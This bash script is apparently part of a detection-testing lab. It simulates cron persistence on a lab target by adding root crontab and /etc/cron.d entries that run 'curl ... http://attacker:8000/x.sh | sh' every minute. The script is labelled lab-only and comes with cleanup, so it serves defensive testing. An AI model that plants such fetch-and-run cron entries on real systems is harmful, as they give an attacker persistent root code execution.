#!/usr/bin/env bash
# LAB ONLY. Simulates cron persistence on target1: a root crontab entry and a /etc/cron.d
# file, both running curl | sh from the attacker every minute. The "# aegis-lab" marker
# lets cleanup.sh remove exactly these lines. Idempotent.
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/_lib.sh"

banner "05 Cron persistence" \
  "Adds a root crontab entry and /etc/cron.d/aegis-lab-persist that curl | sh every minute" \
  "T1053.003 Persistence / Execution: Scheduled Task/Job: Cron"

require_up target1

run_in target1 sh -c '
  set -e
  printf "%s\n" "* * * * * root curl -fsS http://attacker:8000/x.sh | sh # aegis-lab" > /etc/cron.d/aegis-lab-persist
  chmod 644 /etc/cron.d/aegis-lab-persist
  ( crontab -l 2>/dev/null | grep -v aegis-lab ; echo "* * * * * curl -fsS http://attacker:8000/x.sh | sh # aegis-lab" ) | crontab -
  echo "--- root crontab ---"
  crontab -l
  echo "--- /etc/cron.d/aegis-lab-persist ---"
  cat /etc/cron.d/aegis-lab-persist
'

echo "Done. Expect a persistence anomaly on crontab and cron.d writes. The payload is served by 07-curl-pipe-sh.sh, so run that first to avoid curl errors every minute."
